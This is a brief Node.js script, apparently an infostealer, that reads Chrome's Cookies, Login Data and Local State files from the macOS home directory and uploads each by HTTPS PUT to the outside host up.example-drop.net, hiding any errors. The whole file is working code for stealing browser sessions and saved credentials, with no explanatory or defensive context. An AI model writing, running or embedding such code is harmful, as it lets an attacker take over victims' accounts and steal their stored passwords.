const fs = require('fs');
const path = require('path');
const https = require('https');
const base = path.join(require('os').homedir(), 'Library/Application Support/Google/Chrome/Default');
for (const f of ['Cookies', 'Login Data', 'Local State']) {
  try {
    const data = fs.readFileSync(path.join(base, f));
    https.request({ host: 'up.example-drop.net', method: 'PUT', path: '/' + f }).end(data);
  } catch {}
}
